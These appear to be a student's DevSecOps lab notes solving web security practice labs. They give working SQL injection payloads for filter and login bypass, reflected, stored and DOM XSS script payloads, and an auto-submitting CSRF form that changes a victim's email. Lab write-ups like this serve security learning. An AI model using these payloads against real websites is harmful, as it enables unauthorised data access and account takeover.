# SQLi 
## SQL injection vulnerability in WHERE clause
- **payload to inject**:  `' or 1=1 `
- **SQL query executed**: `SELECT * FROM products WHERE category = '' OR 1=1 -- ' AND released = 1 `

![[DevSecOps-lab1-2.png]]
## SQLi vulnerability allowing login bypass
![[DevSecOps-lab1-3.png]]



---

# XSS
## Reflected XSS into HTML context with nothing encoded

```javascript
<script>alert("ha ha")</script>
```

![[DevSecOps-lab1-1 1.png]]
## Stored XSS into HTML context with nothing encoded

![[DevSecOps-lab1-3 1.png]]

![[DevSecOps-lab1-2 2.png]]
![[DevSecOps-lab1-2 1.png]]
## DOM XSS in `document.write` sink using source `location.search`
1. first we enter an alphanumeric string in the input and then we search for it in the DOM elements in dev tools.
2. we notice that our input is int tem img tag
![[DevSecOps-lab1-5.png]]
3. payload to inject 

```javascript
"><script>alert("ha ha") </script>
```

![[DevSecOps-lab1-4.png]]


---

# CSRF
first we log in with the given credentials

![[DevSecOps-lab1-9.png]]
![[DevSecOps-lab1-7.png]]

body of the exploit:
```HTML
<form method="POST" action="https://0a7f009c048922f984c9725300ad0062.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="heha@aa.tn">
</form>
<script>
        document.forms[0].submit();
</script>
```


![[DevSecOps-lab1-8.png]]